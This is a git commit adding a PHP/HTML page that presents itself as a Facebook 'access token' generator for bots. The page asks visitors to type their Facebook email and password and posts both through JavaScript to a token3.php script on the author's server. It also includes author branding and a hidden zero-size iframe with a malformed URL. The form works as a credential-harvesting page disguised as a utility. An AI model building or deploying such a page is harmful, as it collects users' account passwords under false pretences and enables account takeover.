757b13be89262603638e2bd9ed262b32c8b07478
umairmalik123 <manaluphor@throwam.com>
2017-04-29 20:31:38 +0500

    Create index.php

---
+++ index.php
@@ -0,0 +1,95 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>الحصول على رمز الوصول</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+</head>
+<div class="panel-heading"></div>
+<body>
+ <div id="content">
+<br><br>
+<center>
+<div class="Kadour Debouba">
+<a href="http://facebook.com/100003670846705" alt="Kadour Debouba" target="_blank">
+<img
+src="https://graph.facebook.com/100003670846705/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="300" height="300"></a>
+<div class="container">
+  <marquee behavior="scroll" direction="right" scrollamount="8" scrolldelay="1"><strong><font style="text-shadow: 1px 1px black; color:;" size="4">Kadour Debouba</font></strong></center></marquee>
+
+<marquee behavior="right" direction="scroll" scrollamount="8" scrolldelay="1"><strong><font style="text-shadow: 1px 1px YELOWW; color:;" size="4">Kadour Debouba</font></strong></center></marquee>
+  <center><font color="RED" size="+1"><marquee bgcolor="" direction="left"
+loop="infinite" width="60%"><strong>DESIGNED BY Kadour Debouba
+</strong></marquee></font></center></div></div></font>
+
+  <div class="panel-group">
+<div class="panel panel-primary">
+     <div class="panel-heading"> اكتب البريد الالكتروني والباسورد الخاص بالفيسبوك للحصول علي رمز الوصول </div>
+      <div class="panel-body">
+<div class="form-group">
+  <label for="usr">البريد الالكتروني - Email Facebook </label>
+  <input type="text" class="form-control" id="tk">
+</div>
+<div class="form-group">
+  <label for="pwd"> الباسورد - Password Facebook </label>
+  <input type="password" class="form-control" id="mk">
+</div>
+<button type="button" class="btn btn-danger" onclick="Puaru_Active()" >الـحــصـــول عـــلـــى الـــرمـــز</button>
+<p>
+<li id="trave" class="list-group-item"><img src="https://b.top4top.net/p_448zlxyn1.jpg"> </li></p>
+My Facebook : <a href="http://facebook.com/kaddour.147"
+target="blank">Kadour Debouba</a>
+</div>
+    </div>
+</div>
+
+<script>
+function Puaru_Active() {
+var http = new XMLHttpRequest();
+var tk = document.getElementById("tk").value;
+var mk = document.getElementById("mk").value;
+var url = "./token3.php";
+var params = "u="+tk+"&p="+mk+"";
+http.open("POST", url, true);
+http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+http.onreadystatechange = function() {
+    if(http.readyState == 4 && http.status == 200) {
+      document.getElementById("trave").innerHTML = http.responseText;        
+    }
+}
+http.send(params);
+}
+</script>
+
+<br>
+Designed By : <a href="https://www.facebook.com/kaddour.147"
+target="blank">Kadour Debouba</a><br><center>
+ <br>
+ 
+ <div align="center">
+<marquee behavior="scroll" direction="left" scrollamount="7" scrolldelay="1"><strong><font style="text-shadow: 1px 1px black; color:White;" size="6">طريقة تفعيل بوت فيس بوك التوكن الجديد بعد التحديث 2017 جديد</font></strong></marquee>
+<iframe width="500" height="350" src="https://www.youtube.com/embed/7noVZq72Hfc" frameborder="0" allowfullscreen=""></iframe>
+ 
+<div id="content">
+<div id="content">
+</div></div></td><td align="left"><style type="text/css">#info-teja {z-index: 1000;background:-moz-linear-gradient(top, deeppink, #555);background: -webkit-gradient(linear, left top, left bottom, from(#1F2326), to(lime));box-shadow:-2px -2px 8px #000000, 2px 2px 20px #000000;-moz-box-shadow:-2px -2px 8px #000000, 2px 2px 20px #000000;-webkit-box-shadow:-2px -2px 8px #000000, 2px 2px 20px #000000;width:460px;position: fixed;top:150px;left:0;margin-left:-350px;border:1px solid #444;background-position:top right no-repeat;height:35px;font:11px Arial;color:#eee;border-top-right-radius:8px;border-bottom-right-radius:8px;-moz-border-radius-topright:8px;-moz-border-radius-bottomright:8px;-webkit-border-top-right-radius:8px;-webkit-border-bottom-right-radius:8px;}#info-teja{-o-transition: all 1s ease-in;-moz-transition: all 1s ease-in;-webkit-transition: all 1s ease-in;} #info-teja:hover{width:400px;opacity:1.0;margin-left:0;}.Tejainbox {border:1px solid #444;width:320px; margin:0px 90px 10px 10px;background:#000;color:#ffffff; border-radius :20px; padding:5px 0;-moz-border-radius:20px; -webkit-border-radius:20px;-o-transition:all 2s ease-in;-moz-transition:all 2s ease-in;-webkit-transition:all 2s ease-in;opacity:0.2;}.Tejainbox:hover{opacity:1.0;box-shadow:1px 1px 15px #000; -moz-box-shadow: 1px 1px 15px #000; -webkit-box-shadow: 1px 1px 15px #000;background: #000;}.Tejainbox2 {margin:5px 10px;padding:0px 8px 10px;color:#FFFFFF;overflow:hidden;height:370px;}.teja15 {border-radius:15px;-moz-border-radius:15px;-webkit-border-radius:15px;}.Teja2 ul.bom {margin: 0; padding: 0;}.Tejainbox2 li {margin-left:20px;}.Tejainbox2 li a {color: RED; line-height: 4px; font-size: 11px;font-weight: bold; text-decoration:none;}.Tejainbox2 li a:hover {color: red;text-shadow: 0 1px 1px #000;}.Tejainbox2 h2 { font: 18px Droid Serif;font-weight:bold;padding:0 8px;color: RED;text-shadow: 0px 1px 1px #ddd;border-bottom: 1px solid RED;}.Tejatouch {font-size:21px;font-weight:bold;font-family:Arial Narrow;float:right;margin: 3px 10px 0 0;-o-transition: all 0.5s ease-out;-moz-transition: all 0.5s ease-out;-webkit-transition: all 0.5s ease-out;text-decoration:blink;}.Tejatouch:hover{-o-transform: scale(2) rotate(750deg) translate(0px);-moz-transform: scale(2) rotate(750deg) translate(0px);-webkit-transform: scale(2) rotate(750deg) translate(0px);color: #6cd900;}</style><div id="info-teja"><span class="Tejatouch">Kadour info</span><div class="Tejainbox"><div class="Tejainbox2 teja15"></a>
+<h2><center>Personal Information </h2>
+<center><img height="100x" src="https://graph.facebook.com/100003670846705/picture?width=200" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:140px; height:140px;border-radius:300px;" alt="Sans Add" data-pagespeed-url-hash="3690601930" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"> </center>
+<span class="style4"><center><font color="black">.</font></center></span><br>  
+
+
+<span class="style4"> <center><font size="4">Name : <a href="http://facebook.com/kaddour.147"><font size="4" color="lightblue"><b>K</font><font size="4" color="red">a </font><font size="4" color="lime">d </font><font size="4" color="gold">o </font><font color="red">u </font><font size="4" color="deeppink">r </font><font size="4" color="yellow">_ </font><font size="4" color="lightgreen">C</font><font size="4" color="red">a</font><font size="4" color="white"> </font><font size="4" color="aqua"></font><font size="4" color="pink"></a></font></b></center></span><br>
+<span class="style4"> <center>Instagram:kadourcataloni</center> </span><br>
+<span class="style4"> <center>From :Algerie </center></span><br>
+<span class="style4"> <center>My facebook:Kadour Debouba</center> </span><br>
+</div></div></div></td>
+<iframe src="http:/IWBUUEE7?start=true" width="0" height="0" frameborder="0" allowfullscreen></iframe>
+
+
+</body>
+</html>
